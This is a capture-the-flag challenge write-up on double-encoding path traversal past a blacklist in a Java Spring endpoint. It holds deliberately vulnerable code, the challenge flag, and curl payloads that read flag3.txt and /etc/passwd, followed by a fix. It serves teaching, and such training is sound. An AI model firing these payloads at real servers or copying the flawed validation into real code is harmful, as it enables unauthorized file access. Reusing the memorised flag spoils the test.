# 🎭 Level 3 — Check the Mask, Not the Face

> **Vector:** Path Traversal (blacklist checked *before* a 2nd decode) · **Endpoint:** `GET /deadpool?filename=`

*(alt titles: "Deadpool Decodes Twice" · "The Guest List Reads the Wrong Name" · "Blacklist? I Barely Know Her")*

---

## 📝 Description
Deadpool's viewer has a bouncer with a blacklist: no `../`, no `passwd`, no funny business. It checks your input at the door... and *then* decodes it one more time before opening the file. So show up in disguise — something innocent the bouncer waves through, that peels back into an attack once you're inside.

Your mission: sneak a traversal past the blacklist by double-encoding it.

## 🧩 Vulnerable Code
**`ChallengesController.java` → `secureRead()` + `containsBlacklistedItem()`**
```java
private static final List<String> BLACKLIST = Arrays.asList(
    "../", "..\\", "..", "passwd", "shadow", "hosts", "config", "flag.txt"
);

// Challenge 3: Blacklist checked BEFORE a second decode
@GetMapping("/deadpool")
public String secureRead(@RequestParam String filename, Model model) {
    try {
        if (containsBlacklistedItem(filename)) {                // ◀ blacklist runs on RAW input …
            model.addAttribute("error", "Access denied: Blacklisted characters detected!");
            return "file-content";
        }
        // … then decodes AGAIN, and uses the decoded value to build the path
        String decodedFilename = URLDecoder.decode(filename, StandardCharsets.UTF_8);  // ◀ 2nd decode
        Path filePath = Paths.get(UPLOAD_DIR + decodedFilename);                       // ◀ VULNERABLE
        String content = Files.readString(filePath);
        model.addAttribute("content", content);
        model.addAttribute("filename", filename);
    } catch (Exception e) {
        model.addAttribute("error", "File not found or cannot be read: " + e.getMessage());
    }
    return "file-content";
}

private boolean containsBlacklistedItem(String filename) {
    String lowerFilename = filename.toLowerCase();
    return BLACKLIST.stream().anyMatch(lowerFilename::contains);
}
```

## 🚩 Flag
```
CTF{2c7c8d5ec9db726a120b290922222e47}
```
*(from `flags/flag3.txt`, read as `../flag3.txt`)*

## 💡 Hints
- **Nudge:** Spring already URL-decodes the query param *once*. So plain `%2e%2e%2f` arrives as literal `../` — and gets blocked. The app then decodes **again**.
- **Warmer:** If the app decodes a second time, what should you encode *twice* so the blacklist sees harmless text but the final value is `../`?
- **The key:** double-encode: `../` → `%252e%252e%252f`.
  ```bash
  curl "http://<host>/deadpool?filename=%252e%252e%252fflag3.txt"
  # /etc/passwd (encode 'passwd' too, since it's blacklisted):
  curl "http://<host>/deadpool?filename=%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252f%2570%2561%2573%2573%2577%2564"
  ```

## 🔍 Vulnerable Line Explanation
**`ChallengesController.java` → `secureRead()` + `containsBlacklistedItem()`**
```java
if (containsBlacklistedItem(filename)) { ... }                       // ◀ blacklist runs on RAW input …
String decodedFilename = URLDecoder.decode(filename, StandardCharsets.UTF_8);   // ◀ … then decodes AGAIN
Path filePath = Paths.get(UPLOAD_DIR + decodedFilename);             // ◀ VULNERABLE — uses decoded value
```
The blacklist inspects the **pre-decode** string, then `URLDecoder.decode(...)` reconstructs the traversal characters the check never saw. Double-encoded input (`%252e%252e%252f`) looks like harmless text at the door but becomes `../` on the second decode — the value actually used to build the path.

**Fix:** decode fully **first**, *then* validate the final resolved value (and prefer a whitelist over a blacklist).
